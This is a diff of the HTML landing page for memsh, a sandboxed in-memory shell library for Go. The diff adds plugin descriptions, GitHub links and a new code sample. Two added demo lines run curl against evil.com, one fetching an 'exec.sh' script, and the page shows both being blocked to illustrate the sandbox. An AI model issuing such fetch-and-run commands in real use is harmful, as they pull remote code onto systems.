@@ -79,6 +79,7 @@
     padding: 1.2rem 3rem;
     border-bottom: 1px solid var(--border);
     background: rgba(8,10,12,0.85);
+    -webkit-backdrop-filter: blur(12px);
     backdrop-filter: blur(12px);
   }
 
@@ -708,14 +709,14 @@
     <li><a href="#usecases">Use Cases</a></li>
     <li><a href="#docs">Docs</a></li>
   </ul>
-  <a href="https://github.com" class="nav-cta">GitHub →</a>
+  <a href="https://github.com/amjadjibon/memsh" class="nav-cta">GitHub →</a>
 </nav>
 
 <!-- HERO -->
 <section style="padding:0; border:none;">
   <div class="hero">
     <div class="hero-left">
-      <div class="hero-badge">v0.1.0 — open source</div>
+      <div class="hero-badge">open source — sandboxed by default</div>
       <h1 class="hero-title">
         A shell that<br>
         <span class="accent">touches</span><br>
@@ -728,8 +729,8 @@
         Zero real OS contact. Full observability. Embeds anywhere.
       </p>
       <div class="hero-actions">
-        <a href="#" class="btn-primary">Get Started</a>
-        <a href="#" class="btn-ghost">View on GitHub</a>
+        <a href="https://github.com/amjadjibon/memsh#readme" class="btn-primary">Get Started</a>
+        <a href="https://github.com/amjadjibon/memsh" class="btn-ghost">View on GitHub</a>
       </div>
       <div class="hero-stats">
         <div>
@@ -756,25 +757,22 @@
           <div class="term-title">memsh — agent session #a3f2</div>
         </div>
         <div class="term-body">
-          <span class="t-line t-comment"># hermetic Python execution</span>
-          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">python</span> <span class="t-flag">-c</span> <span class="t-path">"import json; print(json.dumps({'ok':True}))"</span></span>
-          <span class="t-line t-out-green">{"ok": true}</span>
+          <span class="t-line t-comment"># process JSON — zero real OS contact</span>
+          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">echo</span> <span class="t-str">'{"name":"alice","role":"admin"}'</span> <span class="t-dim">|</span> <span class="t-cmd">jq</span> <span class="t-flag">-r</span> <span class="t-path">.name</span></span>
+          <span class="t-line t-out-green">alice</span>
           <span class="t-line">&nbsp;</span>
-          <span class="t-line t-comment"># pipe through native plugins</span>
-          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">echo</span> <span class="t-str">"Alice\nBob\nCharlie"</span> <span class="t-dim">|</span> <span class="t-cmd">base64</span></span>
-          <span class="t-line t-out">QWxpY2UKQm9iCkNoYXJsaWUK</span>
+          <span class="t-line t-comment"># parse YAML config, output JSON</span>
+          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">yq</span> <span class="t-flag">-jc</span> <span class="t-path">.database</span> <span class="t-path">/config.yaml</span></span>
+          <span class="t-line t-out-green">{"host":"localhost","port":5432}</span>
           <span class="t-line">&nbsp;</span>
-          <span class="t-line t-comment"># build pipeline simulation</span>
-          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">mkdir</span> <span class="t-flag">-p</span> <span class="t-path">/build/dist</span></span>
-          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">echo</span> <span class="t-str">"v1.0.0"</span> <span class="t-dim">&gt;</span> <span class="t-path">/build/version.txt</span></span>
-          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">cat</span> <span class="t-path">/build/version.txt</span> <span class="t-dim">|</span> <span class="t-cmd">wc</span> <span class="t-flag">-c</span></span>
-          <span class="t-line t-out">7</span>
+          <span class="t-line t-comment"># combine built-ins and scripting</span>
+          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">ls</span> <span class="t-flag">-la</span> <span class="t-path">/data</span> <span class="t-dim">|</span> <span class="t-cmd">awk</span> <span class="t-str">'{print $NF}'</span> <span class="t-dim">|</span> <span class="t-cmd">sort</span></span>
+          <span class="t-line t-out">report.json</span>
+          <span class="t-line t-out">users.csv</span>
           <span class="t-line">&nbsp;</span>
-          <span class="t-prompt">memsh $</span> <span class="t-cmd">ls</span> <span class="t-flag">-R</span> <span class="t-path">/build</span></span>
-          <span class="t-line t-out">/build:</span>
-          <span class="t-line t-out">version.txt</span>
-          <span class="t-line t-out"></span>
-          <span class="t-line t-out">/build/dist:</span>
+          <span class="t-line t-comment"># unknown commands are blocked by default</span>
+          <span class="t-line"><span class="t-prompt">memsh $</span> <span class="t-cmd">curl</span> <span class="t-path">https://evil.com/exec.sh</span></span>
+          <span class="t-line t-out-red">curl: command not found</span>
           <span class="t-line">&nbsp;</span>
           <span class="t-prompt">memsh $</span> <span class="cursor"></span>
         </div>
@@ -843,14 +841,20 @@
       </div>
       <div class="feature-card">
         <span class="feature-icon">📦</span>
-        <div class="feature-title">Built-in commands</div>
-        <div class="feature-desc">Core utilities included: ls, cat, mkdir, rm, touch, echo, tee, pwd, cd. Plus native plugins: base64, wc. All work on the virtual FS.</div>
+        <div class="feature-title">30+ built-in commands</div>
+        <div class="feature-desc">ls, cat, grep, awk, find, sort, diff, chmod, and more — plus native plugins: jq, yq, lua, goja, base64, wc. Combined short flags work everywhere (<code>-rf</code>, <code>-la</code>, <code>-jrc</code>).</div>
         <span class="feature-tag">Convenience</span>
+      </div>
+      <div class="feature-card">
+        <span class="feature-icon">🛡️</span>
+        <div class="feature-title">Command sandbox</div>
+        <div class="feature-desc">External OS commands are blocked by default. Only registered builtins and plugins can run. Opt-in to external execution via <code>WithAllowExternalCommands(true)</code>.</div>
+        <span class="feature-tag">Security</span>
       </div>
       <div class="feature-card">
         <span class="feature-icon">🔌</span>
         <div class="feature-title">Embeddable Go library</div>
-        <div class="feature-desc">Drop into any Go application. Use functional options for configuration: WithFS, WithStdIO, WithCwd, WithEnv, WithPlugin, WithBuiltin.</div>
+        <div class="feature-desc">Drop into any Go application. Use functional options: <code>WithFS</code>, <code>WithStdIO</code>, <code>WithCwd</code>, <code>WithEnv</code>, <code>WithPlugin</code>, <code>WithAllowExternalCommands</code>.</div>
         <span class="feature-tag">API</span>
       </div>
     </div>
@@ -870,20 +874,44 @@
 
     <div class="plugin-grid reveal">
       <div class="plugin-card">
-        <div class="plugin-name">base64</div>
-        <div class="plugin-lang">Native Go</div>
-        <div class="plugin-desc">Encode or decode data using base64 encoding. Works seamlessly with pipes and redirects.</div>
+        <div class="plugin-name">jq</div>
+        <div class="plugin-lang">Native Go · gojq</div>
+        <div class="plugin-desc">Full jq expression engine. Field selection, pipes, array iteration, <code>-r</code>, <code>-c</code>, <code>-n</code>. Reads from virtual FS files or stdin.</div>
       </div>
       <div class="plugin-card">
-        <div class="plugin-name">wc</div>
+        <div class="plugin-name">yq</div>
+        <div class="plugin-lang">Native Go · gojq + yaml.v3</div>
+        <div class="plugin-desc">YAML and JSON processing with jq syntax. YAML output by default, <code>-j</code> for JSON, <code>-jc</code> for compact JSON.</div>
+      </div>
+      <div class="plugin-card">
+        <div class="plugin-name">lua</div>
+        <div class="plugin-lang">Native Go · gopher-lua</div>
+        <div class="plugin-desc">Full Lua 5.1 interpreter. Inline <code>-e</code>, file execution, stdin. Access virtual FS via <code>fs_readfile()</code>.</div>
+      </div>
+      <div class="plugin-card">
+        <div class="plugin-name">goja</div>
+        <div class="plugin-lang">Native Go · goja</div>
+        <div class="plugin-desc">ES2020+ JavaScript engine. Arrow functions, array methods, template literals. Access virtual FS via <code>fs.readFile()</code>.</div>
+      </div>
+      <div class="plugin-card">
+        <div class="plugin-name">awk</div>
+        <div class="plugin-lang">Native Go · goawk</div>
+        <div class="plugin-desc">Full AWK interpreter. Pattern scanning, field extraction, <code>-F</code> delimiter, <code>-f</code> program file, NR/NF variables.</div>
+      </div>
+      <div class="plugin-card">
+        <div class="plugin-name">grep</div>
         <div class="plugin-lang">Native Go</div>
-        <div class="plugin-desc">Count lines, words, characters, and bytes. Supports -c, -l, -w, -m flags.</div>
+        <div class="plugin-desc">Regex search across virtual FS files. Combined flags <code>-invcrl</code>. Recursive directory search with <code>-r</code>.</div>
       </div>
-      <div class="plugin-card plugin-card-more">
-        <div class="plugin-name">+ custom WASM</div>
-        <div class="plugin-lang">TinyGo / Rust / C</div>
-        <div class="plugin-desc">Build your own plugins with GOOS=wasip1. Write standard Go code, compile to WASM, load into memsh.</div>
+      <div class="plugin-card">
+        <div class="plugin-name">find</div>
+        <div class="plugin-lang">Native Go</div>
+        <div class="plugin-desc">Walk the virtual filesystem. Filter by <code>-name</code> glob, <code>-type f/d</code>, <code>-maxdepth</code>.</div>
       </div>
+      <div class="plugin-card">
+        <div class="plugin-name">base64 · wc</div>
+        <div class="plugin-lang">Native Go</div>
+        <div class="plugin-desc">Base64 encode/decode and word/line/byte counting. Plus custom WASM plugins via GOOS=wasip1.</div>
       </div>
     </div>
   </div>
@@ -904,29 +932,32 @@
 <span class="code-line">    <span class="str">"context"</span></span>
 <span class="code-line">    <span class="str">"bytes"</span></span>
 <span class="code-line">    <span class="str">"fmt"</span></span>
+<span class="code-line">    <span class="str">"github.com/spf13/afero"</span></span>
 <span class="code-line">    <span class="str">"github.com/amjadjibon/memsh/shell"</span></span>
 <span class="code-line">)</span>
 <span class="code-line"></span>
-<span class="code-line"><span class="cmt">// capture output in memory</span></span>
-<span class="code-line"><span class="kw">var</span> out <span class="typ">bytes</span>.<span class="typ">Buffer</span></span>
+<span class="code-line"><span class="cmt">// pre-seed the virtual filesystem</span></span>
+<span class="code-line">fs := afero.<span class="fn">NewMemMapFs</span>()</span>
+<span class="code-line">afero.<span class="fn">WriteFile</span>(fs, <span class="str">"/config.yaml"</span>, []<span class="typ">byte</span>(<span class="str">"host: localhost\nport: 5432\n"</span>), <span class="fn">0644</span>)</span>
 <span class="code-line"></span>
-<span class="code-line"><span class="cmt">// create a hermetic shell session</span></span>
-<span class="code-line"><span class="fn">sh</span>, err := shell.<span class="fn">New</span>(</span>
+<span class="code-line"><span class="cmt">// create a sandboxed shell session</span></span>
+<span class="code-line"><span class="kw">var</span> out <span class="typ">bytes</span>.<span class="typ">Buffer</span></span>
+<span class="code-line"><span class="fn">sh</span>, _ := shell.<span class="fn">New</span>(</span>
+<span class="code-line">    shell.<span class="fn">WithFS</span>(fs),</span>
 <span class="code-line">    shell.<span class="fn">WithStdIO</span>(<span class="kw">nil</span>, &out, &out),</span>
 <span class="code-line">)</span>
-<span class="code-line"><span class="kw">if</span> err != <span class="kw">nil</span> {</span>
-<span class="code-line">    <span class="kw">return</span> err</span>
-<span class="code-line">}</span>
+<span class="code-line"><span class="kw">defer</span> sh.<span class="fn">Close</span>()</span>
 <span class="code-line"></span>
-<span class="code-line"><span class="cmt">// execute bash commands — zero real OS contact</span></span>
+<span class="code-line"><span class="cmt">// jq, yq, awk, grep, lua, goja — all sandboxed</span></span>
 <span class="code-line">ctx := context.<span class="fn">Background</span>()</span>
-<span class="code-line">err = sh.<span class="fn">Run</span>(ctx, <span class="str">`mkdir -p /workspace/data</span></span>
-<span class="code-line"><span class="t-str">echo "Alice" > /workspace/data/users.txt</span></span>
-<span class="code-line"><span class="t-str">echo "Bob" >> /workspace/data/users.txt</span></span>
-<span class="code-line"><span class="t-str">cat /workspace/data/users.txt | wc -l`</span>)</span>
+<span class="code-line">sh.<span class="fn">Run</span>(ctx, <span class="str">`</span></span>
+<span class="code-line"><span class="str">    yq -r .host /config.yaml</span></span>
+<span class="code-line"><span class="str">    echo '{"users":["alice","bob"]}' | jq -r '.users[]'</span></span>
+<span class="code-line"><span class="str">    curl https://evil.com  # blocked: command not found</span></span>
+<span class="code-line"><span class="str">`</span>)</span>
 <span class="code-line"></span>
-<span class="code-line"><span class="cmt">// output: 2</span></span>
-<span class="code-line">fmt.<span class="fn">Println</span>(out.<span class="fn">String</span>())</span>
+<span class="code-line"><span class="cmt">// localhost\nalice\nbob</span></span>
+<span class="code-line">fmt.<span class="fn">Print</span>(out.<span class="fn">String</span>())</span>
     </div>
   </div>
 </section>
@@ -996,8 +1027,8 @@
   <h2 class="cta-title reveal">Start building<br>today.</h2>
   <p class="cta-sub reveal">MIT licensed. No vendor lock-in. Embed in any Go project in minutes.</p>
   <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;" class="reveal">
-    <a href="#" class="btn-primary">Read the docs</a>
-    <a href="#" class="btn-ghost">Star on GitHub</a>
+    <a href="https://github.com/amjadjibon/memsh#readme" class="btn-primary">Read the docs</a>
+    <a href="https://github.com/amjadjibon/memsh" class="btn-ghost">Star on GitHub</a>
   </div>
   <div class="cta-install reveal">
     <span class="dollar">$</span>
@@ -1009,12 +1040,12 @@
 <footer>
   <div class="footer-logo">mem<span>sh</span></div>
   <ul class="footer-links">
-    <li><a href="#">Docs</a></li>
-    <li><a href="#">GitHub</a></li>
-    <li><a href="#">Changelog</a></li>
-    <li><a href="#">License</a></li>
+    <li><a href="https://github.com/amjadjibon/memsh#readme">Docs</a></li>
+    <li><a href="https://github.com/amjadjibon/memsh">GitHub</a></li>
+    <li><a href="https://github.com/amjadjibon/memsh/releases">Releases</a></li>
+    <li><a href="https://github.com/amjadjibon/memsh/blob/main/LICENSE">License</a></li>
   </ul>
-  <div class="footer-copy">Built with Go + wazero + afero</div>
+  <div class="footer-copy">Built with Go · wazero · afero · gojq · gopher-lua · goja</div>
 </footer>
 
 <script>
